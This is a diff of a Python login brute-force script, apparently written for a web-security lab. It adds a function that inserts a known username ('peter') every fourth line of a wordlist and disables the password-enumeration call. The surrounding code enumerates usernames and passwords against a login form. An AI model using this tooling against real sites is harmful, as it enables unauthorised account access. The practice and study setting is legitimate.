@@ -11,6 +11,9 @@ PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
 SEARCH_TERM = 'Invalid username or password.'
+WORDLIST = 'authentication/wordlists/test.txt'
+WORD = 'peter'
+AFTER_EVERY = 4
 
 def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
     session = requests.Session()
@@ -143,9 +146,44 @@ def search_tree(content, term):
 
     return tree.xpath(f'.//*[text()=\'{term}\']')
 
+def modify_wordlist(wordlist, word, insert_every=0):
+    words = list()
+    word += '\n'
+
+    try:
+        with open(wordlist, 'r') as wl:
+            words = wl.readlines()
+
+        count = 0
+        required_words = len(words) + (len(words) // (insert_every - 1))
+        print(required_words)
+        words.insert(0, word)
+
+        for index in range(1, required_words):
+            if index % insert_every == 0:
+                words.insert(index, word)
+                count += 1
+
+        print(f'The word was inserted {count} times at every {insert_every} occurance.')
+        print(f'There is now a total of {len(words)} words.')
+    except FileNotFoundError:
+        sys.exit('The file was not found')
+    except Exception as e:
+        sys.exit(f'An error occurred: {e}')
+
+    try:
+        with open(wordlist, 'w') as wl:
+            words = wl.writelines(words)
+
+        print(f'The new list was successfully saved to {wordlist} file.')
+    except Exception as e:
+            sys.exit(f'An error occurred: {e}')
+            
+
 if __name__ == '__main__':
+    modify_wordlist(WORDLIST, WORD, AFTER_EVERY)
     #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT)
-    enumerate_password(
+    '''enumerate_password(
         TARGET,
         enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, SEARCH_TERM, TIMEOUT),
         PASSWORD_LIST,
@@ -153,4 +191,4 @@ if __name__ == '__main__':
         PASSWORD_INPUT_NAME,
         SEARCH_TERM,
         TIMEOUT
-    )
+    )'''
